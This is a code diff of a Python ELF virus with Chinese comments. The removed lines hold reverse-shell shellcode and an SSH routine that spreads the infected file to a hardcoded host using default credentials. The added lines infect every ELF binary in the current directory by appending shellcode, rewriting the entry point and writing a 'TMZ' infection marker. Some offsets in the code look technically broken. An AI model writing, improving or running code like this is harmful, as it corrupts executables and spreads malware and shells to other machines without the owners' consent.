@@ -1,61 +1,91 @@
 import struct
-import paramiko
+import os
 
-# PT_NOTE jump to PT_LOAD 
-def modify_ptnote_jump(fd, note_offset, load_vaddr):
+# 修改 PT_NOTE 段为 PT_LOAD 段
+def modify_ptnote_to_ptload(fd, note_offset):
     fd.seek(note_offset)
-    #  PT_LOAD offset
-    jump_offset = load_vaddr - (note_offset + 5)
-    jmp_instr = b'\xE9' + struct.pack('<I', jump_offset & 0xFFFFFFFF)  # JMP 
-    fd.write(jmp_instr)
+    fd.write(struct.pack('<I', 1))  # 将 NOTE 段类型修改为 LOAD
 
-# inject shellcode to PT_LOAD 
-def inject_shellcode(fd, load_offset, shellcode):
-    fd.seek(load_offset)
-    fd.write(b'infected')  # 
-    fd.write(shellcode)    # inject Shell by shellcode
+# 注入 shellcode 到指定位置
+def inject_shellcode(fd, injection_offset, shellcode):
+    fd.seek(injection_offset)
+    fd.write(shellcode)
 
-def propagate_to_remote(host, port, user, password, infected_file):
-    ssh = paramiko.SSHClient()
-    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+# 检查文件是否为 ELF 并且未被感染
+def is_elf_and_not_infected(fd):
+    fd.seek(0)
+    magic = fd.read(4)
+    if magic != b'\x7fELF':
+        return False
 
-    try:
-        ssh.connect(host, port=port, username=user, password=password)
-        sftp = ssh.open_sftp()
-        sftp.put(infected_file, f"/tmp/{infected_file}")
-        sftp.close()
-        print(f"Successfully propagated {infected_file} to {host}")
-    except Exception as e:
-        print(f"Failed to propagate to {host}: {e}")
-    finally:
-        ssh.close()
+    # 检查是否已经被感染
+    fd.seek(0x152)  # 检查 ELF 头中的填充字段
+    signature = fd.read(4)
+    if signature == b'TMZ\x00':  # 假设 'TMZ' 是感染标志
+        return False
+
+    return True
+
+# 修改 ELF 文件的入口点
+def modify_entry_point(fd, new_entry_point):
+    fd.seek(0x18)  # ELF header 中 e_entry 字段的偏移位置
+    fd.write(struct.pack('<Q', new_entry_point))
 
 def infect_elf(file_path):
-    with open(file_path, 'rb+') as fd:
-        # 使用 PT_NOTE 和 PT_LOAD 的已知偏移和地址
-        note_offset = 0x358  # PT_NOTE 段的文件偏移
-        load_offset = 0x1175  # PT_LOAD 段的文件偏移
-        load_vaddr = 0x1175  # PT_LOAD 段的虚拟地址
+    try:
+        with open(file_path, 'rb+') as fd:
+            print(f"Attempting to infect: {file_path}")
 
-        # 反向 Shell shellcode
-        shellcode = (
-            b"\x48\x31\xc0\x50\x50\x50\xb0\x29\x48\x31\xff\xbf\x02\x00\x01\xbb"
-            b"\x48\x89\xe7\x48\x31\xf6\x0f\x05\x48\x97\x48\x31\xc0\x50\x66\x68"
-            b"\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\x0f\x05\x48\x31\xc0\xb0\x21"
-            b"\x48\x31\xff\x48\xff\xc7\x0f\x05\x48\x83\xf9\x02\x75\xf3\x48\x31"
-            b"\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
-            b"\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
-        )
+            # 检查文件是否为 ELF 且未被感染
+            if not is_elf_and_not_infected(fd):
+                print(f"Skipping: {file_path}")
+                return
 
-        # inject shellcode
-        inject_shellcode(fd, load_offset, shellcode)
+            # 获取原始入口点
+            fd.seek(0x18)  # ELF header 中 e_entry 字段的偏移
+            original_entry_point = struct.unpack('<Q', fd.read(8))[0]
 
-        #  PT_NOTE to PT_LOAD
-        modify_ptnote_jump(fd, note_offset, load_vaddr)
+            # 构造 shellcode
+            # 该 shellcode 负责显示一段信息并跳转回原始程序入口点
+            shellcode = (
+                b"\x50\x51\x52\x53\x54\x55\x56\x57"                # 保存寄存器 (push rax, rcx, rdx, rbx, rsp, rbp, rsi, rdi)
+                b"\x48\xc7\xc0\x01\x00\x00\x00"                    # mov rax, 1 (系统调用号 1 表示 write)
+                b"\x48\xc7\xc7\x01\x00\x00\x00"                    # mov rdi, 1 (文件描述符 1 表示标准输出)
+                b"\x48\x8d\x35\x10\x00\x00\x00"                    # lea rsi, [rip+0x10] (消息地址)
+                b"\x48\xc7\xc2\x16\x00\x00\x00"                    # mov rdx, 22 (消息长度)
+                b"\x0f\x05"                                        # syscall (触发系统调用)
+                b"\x5f\x5e\x5d\x5c\x5b\x5a\x59\x58"                # 恢复寄存器 (pop rdi, rsi, rbp, rsp, rbx, rdx, rcx, rax)
+                b"\x48\xb8" + struct.pack('<Q', original_entry_point) + b"\xff\xe0"  # 跳转到原始入口点
+                b"Midrashim by TMZ (c) 2020\n"                     # 要输出的消息
+            )
 
-        # Diffusion de fichiers infectés vers d'autres hôtes
-        propagate_to_remote('192.168.1.105', 22, 'user', 'password', file_path)
+            # 注入 shellcode 到文件末尾
+            fd.seek(0, os.SEEK_END)  # 确定文件末尾
+            end_of_file = fd.tell()
 
-# 开始感染
-infect_elf('hello')
+            # 确保注入的位置足够
+            injection_offset = end_of_file
+            inject_shellcode(fd, injection_offset, shellcode)
+
+            # 修改入口点为注入代码的位置
+            modify_entry_point(fd, injection_offset)
+
+            # 标记文件为已感染
+            fd.seek(0x152)
+            fd.write(b'TMZ\x00')
+
+            print(f"Infected: {file_path}")
+    except Exception as e:
+        print(f"Failed to infect {file_path}: {e}")
+
+# 遍历当前目录并感染所有符合条件的 ELF 文件
+def main():
+    current_dir = os.getcwd()
+    for file_name in os.listdir(current_dir):
+        file_path = os.path.join(current_dir, file_name)
+        if os.path.isfile(file_path):
+            infect_elf(file_path)
+
+if __name__ == "__main__":
+    main()
 
